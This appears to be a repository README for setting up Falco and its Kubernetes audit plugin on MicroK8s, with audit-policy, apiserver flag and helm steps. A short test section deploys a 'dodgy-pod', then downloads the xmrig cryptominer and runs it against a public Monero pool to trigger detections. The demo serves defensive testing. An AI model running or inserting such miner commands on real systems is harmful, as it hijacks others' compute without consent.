# Falco-MicroK8s
Setting up Falco's Kubernetes Audit plugin for MicroK8s

To enable the addon:
```
microk8s enable falco
```
The addon can be disabled at any time with:
```
microk8s disable falco
```
Accessing the FalcoSideKick user interface
```
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802 --insecure-skip-tls-verify
```
```
sudo usermod -a -G microk8s $USER
sudo chown -f -R $USER ~/.kube
```
You will also need to re-enter the session for the group update to take place:
```
su - $USER
```
Will probably set up the alias at the start of each sesson:
```
alias kubectl='microk8s kubectl'
alias helm='microk8s helm3'
```
```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
```
kubectl exec -it dodgy-pod -- bash
```
```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```

# Enable K8s Auditing
```
mkdir /var/snap/microk8s/common/var/lib/k8s_audit
```
```
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/audit-policy.yaml
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/webhook-config.yaml
wget https://raw.githubusercontent.com/jasonumiker-sysdig/kubernetes-security-demos/cc2ebd3e56a2eac0a9a20668dfb91b30af0f9e00/setup-cluster/falco-values.yaml
```
```
AGENT_SERVICE_CLUSTERIP=$(kubectl get service falco-k8saudit-webhook -o=jsonpath={.spec.clusterIP} -n falco) envsubst < webhook-config.yaml.in > webhook-config.yaml
```
```
cp ./webhook-config.yaml /var/snap/microk8s/common/var/lib/k8s_audit/
cp ./audit-policy.yaml /var/snap/microk8s/common/var/lib/k8s_audit/
cat /var/snap/microk8s/current/args/kube-apiserver > kube-apiserver
```
```
cat << EOF >> kube-apiserver
--audit-log-path=/var/snap/microk8s/common/var/lib/k8s_audit/k8s_audit_events.log
--audit-policy-file=/var/snap/microk8s/common/var/lib/k8s_audit/audit-policy.yaml
--audit-log-maxbackup=1
--audit-log-maxsize=10
--audit-webhook-config-file=/var/snap/microk8s/common/var/lib/k8s_audit/webhook-config.yaml
--audit-webhook-batch-max-wait=5s
EOF
```
```
mv /var/snap/microk8s/current/args/kube-apiserver /var/snap/microk8s/current/args/kube-apiserver-orig
cp ./kube-apiserver /var/snap/microk8s/current/args/
chown root:microk8s /var/snap/microk8s/current/args/kube-apiserver
```
```
microk8s stop
```
```
microk8s start
sleep 30
```
```
kubectl rollout status daemonset falco -n falco --timeout 300s
```

# Deploying Custom Rules
```
wget https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/falco-talon/custom-rules.yaml
```
```
helm upgrade falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set "falcoctl.config.artifact.install.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falcoctl.config.artifact.follow.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falco.rules_file={/etc/falco/falco_rules.yaml,/etc/falco/falco-incubating_rules.yaml,/etc/falco/falco-sandbox_rules.yaml,/etc/falco/rules.d}" \
  -f custom-rules.yaml
```
